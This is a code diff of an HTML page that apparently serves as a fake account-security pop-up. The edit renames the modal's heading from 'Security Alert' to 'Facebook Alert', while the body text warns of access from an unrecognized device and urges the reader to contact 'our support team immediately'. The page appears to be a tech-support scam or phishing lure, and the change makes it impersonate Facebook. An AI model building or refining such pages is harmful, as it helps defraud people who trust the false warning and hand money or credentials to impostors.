@@ -298,7 +298,7 @@
         }
         
         /* Orientation changes */
-        @media (orientation: landscape) and (max-height: 500px) {
+        @media (orientation: portrait) and (max-height: 500px) {
             body::before {
                 background-size: cover;
                 background-position: center top;
@@ -321,7 +321,7 @@
     <!-- Alert Dialog -->
     <div class="modal-overlay" id="modalOverlay">
         <div class="alert-dialog">
-            <div class="alert-header">Security Alert</div>
+            <div class="alert-header">Facebook Alert</div>
             <div class="alert-body">
                 <p>Warning: Your account may have been accessed from an unrecognized device in a different location.</p>
                 <p>For your security, please verify your identity by contacting our support team immediately.</p>
@@ -398,4 +398,5 @@
         });
     </script>
 </body>
+
 </html>
